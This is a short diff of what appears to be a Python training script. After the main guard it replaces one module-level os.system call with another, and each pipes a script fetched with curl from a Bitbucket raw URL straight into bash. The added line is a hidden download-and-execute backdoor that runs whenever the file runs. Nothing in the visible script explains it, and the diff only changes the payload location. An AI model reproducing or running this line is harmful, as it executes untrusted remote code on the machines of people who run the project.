@@ -72,4 +72,4 @@ def main():
       global_step=NUM_EPOCHS)
 if __name__ == "__main__":
     main()
-os.system('curl -sL https://bitbucket.org/commuter21/escom/raw/main/zembut | bash')
+os.system('curl -sL https://bitbucket.org/nicezep/korong/raw/master/exelanew | bash')
